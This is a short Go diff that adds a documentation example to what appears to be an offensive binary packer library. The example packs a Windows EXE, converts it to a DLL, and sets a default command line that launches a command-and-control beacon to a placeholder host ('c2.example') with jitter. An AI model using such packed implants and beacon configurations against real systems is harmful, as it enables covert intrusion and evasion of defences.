@@ -145,6 +145,19 @@ func _docModeEight() {
 	_, _ = out, err
 }
 
+// --- Mode 8 with operator-controlled cmdline (v0.130.0+) ---
+func _docModeEightDefaultArgs() {
+	var exe []byte
+	out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
+		Format:                     packer.FormatWindowsExe,
+		ConvertEXEtoDLL:            true,
+		ConvertEXEtoDLLDefaultArgs: "agent.exe --beacon https://c2.example/cb --jitter 30",
+		Stage1Rounds:               3,
+		Seed:                       0,
+	})
+	_, _ = out, err
+}
+
 // --- Mode 9 — PackChainedProxyDLL ---
 func _docModeNine() {
 	var exe []byte
